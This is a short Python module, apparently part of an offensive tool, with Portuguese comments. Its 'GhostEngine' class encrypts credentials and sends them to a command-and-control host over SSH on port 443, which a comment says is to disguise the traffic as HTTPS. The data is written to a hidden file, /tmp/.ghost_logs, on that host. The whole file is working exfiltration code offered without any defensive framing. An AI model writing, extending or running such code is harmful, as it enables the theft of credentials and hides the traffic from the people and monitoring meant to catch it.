# [ARQUIVO: ghost_engine.py]
import paramiko
from cryptography.fernet import Fernet
import socket

class GhostEngine:
    def __init__(self, key_path="nexus_prime.key"):
        with open(key_path, "rb") as f:
            self.cipher = Fernet(f.read())
            
    def cifrar_dados(self, texto):
        """Transforma credenciais em ruído ilegível."""
        return self.cipher.encrypt(texto.encode())

    def transmitir_via_tunel(self, host_c2, user, pkey, payload_cifrado):
        """Abre o túnel reverso e ejeta o dado cifrado."""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Conecta na porta 443 para mascarar como tráfego HTTPS
            ssh.connect(host_c2, port=443, username=user, key_filename=pkey)
            
            # Simulação de comando remoto para entrega do payload
            stdin, stdout, stderr = ssh.exec_command(f"echo {payload_cifrado.decode()} >> /tmp/.ghost_logs")
            ssh.close()
            return True
        except Exception as e:
            print(f"⚠️ Erro na transmissão: {e}")
            return False
